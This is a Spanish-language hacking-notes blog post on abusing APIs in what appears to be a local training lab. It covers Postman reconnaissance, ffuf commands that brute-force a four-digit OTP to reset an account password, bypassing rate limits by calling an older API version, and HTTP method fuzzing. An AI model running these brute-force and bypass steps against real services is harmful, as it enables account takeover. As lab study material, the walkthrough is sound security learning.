---
layout: single
title: Abuso de APIs - Hacking Notes
excerpt: "Ejemplos de abuso de APIs (Spanish)"
date: 2025-03-16
classes: wide
header:
  teaser: /img2/obsidian.jpg
  teaser_home_page: true
  icon: /img2/images/Dashboard.jpeg
categories:
  - Hacking Notes
  - Web
tags:
  - API
---


# Índice
---------
1. [[#Identificación de API]]
2. [[#Analizamos la petición]]
3. [[#Reconocimiento con Postman]]
4. [[#Explotación de un endpoint con fuerza bruta]]
5. [[#Explotación de un endpoint cambiando el método]]
6. [[#SQLi y NoSQLi en APIs]]

------------

## Identificación de API
![](/img/Pasted%20image%2020241210100811.png)

![](Pasted image 20241210100811.png)
Seleccionamos la opción XHR para ver las peticiones más concretas 

---------
## Analizamos la petición 
1. Vemos el método y el endpoint
![](/img/Pasted%20image%2020241210101101.png)


2. Vemos el contenido que mandamos 
![](/img/Pasted%20image%2020241210101153.png)


3. Vemos la respuesta
![](/img/Pasted%20image%2020241210101334.png)

Nos está devolviendo un token de sesión, en este caso un [[Conceptos#JSON Web Token (JWT)]]

------------
## Reconocimiento con Postman

1. Creamos una nueva colección 
![](/img/Pasted%20image%2020241210105607.png)

2. Mandamos una petición por post al endpoint http://localhost:8888/identity/api/auth/login
![](/img/Pasted%20image%2020241210105759.png)

Vemos que hay errores ya que faltan parámentros 

3. Mandamos la petición con el contenido en formato JSON
![](/img/Pasted%20image%2020241210110010.png)

Podemos guardar esta petición para tener más organización

4. Creamos otra petición para el dashboard
![](/img/Pasted%20image%2020241210110233.png)

Vemos que da error ya que tenemos que arrastrar el JWT, debido a que este endpoint se utiliza una vez está iniciada la sesión 

5. Creamos una variable para usar el JWT
![](/img/Pasted%20image%2020241210110747.png)

![](/img/Pasted%20image%2020241210111518.png)


6. Creamos otra petición al endpoint http://localhost:8888/workshop/api/shop/products
![](/img/Pasted%20image%2020241210111829.png)


7. Creamos otra petición al endpoint http://localhost:8888/workshop/api/shop/orders
![](/img/Pasted%20image%2020241210112126.png)


8. Creamos otra petición al endpoint http://localhost:8888/workshop/api/shop/orders/reuturn_order?order_id=1
![](/img/Pasted%20image%2020241210114750.png)


9. Creamos otra petición al endpoint http://localhost:8888/identity/api/auth/v3/check-otp
![](/img/Pasted%20image%2020241210115647.png)

Ya que el código de verificación que nos mandan es únicamente de 4 dígitos, podemos emplear fuerza bruta

## Explotación de un endpoint con fuerza bruta

```bash
ffuf -u http://localhost:8888/identity/api/aut/v3/check-otp -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -X POST -d '{"email":"s4vitar@hack4u.io","otp":"FUZZ","password":"NewPass123$!"}' -H "Content-Type: application/json" -p 1 -mc 200
```
Como esta versión de API v3 tiene una restricción de solicitudes, podemos intentar mandar la misma petición a la versión más antigua expuesta, en este caso la v2

```bash
ffuf -u http://localhost:8888/identity/api/aut/v2/check-otp -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -X POST -d '{"email":"s4vitar@hack4u.io","otp":"FUZZ","password":"NewPass123$!"}' -H "Content-Type: application/json" -p 1 -mc 200
```

## Explotación de un endpoint cambiando el método

1. Empleamos fuzzing
```bash
ffuf -u http://localhost:8888/workshop/api/shop/products -w /usr/share/SecLists/Fuzzing/http-request-methods.txt -X FUZZ -p 1 -mc 401,200
```

2. Usamos el método options 
![](/img/Pasted%20image%2020241210121405.png)


3. Probamos el método POST y cambiamos los parámetros
![](/img/Pasted%20image%2020241210121756.png)


## SQLi y NoSQLi en APIs

1. NoSQLi en Mongodb
![](/img/Pasted%20image%2020241210122908.png)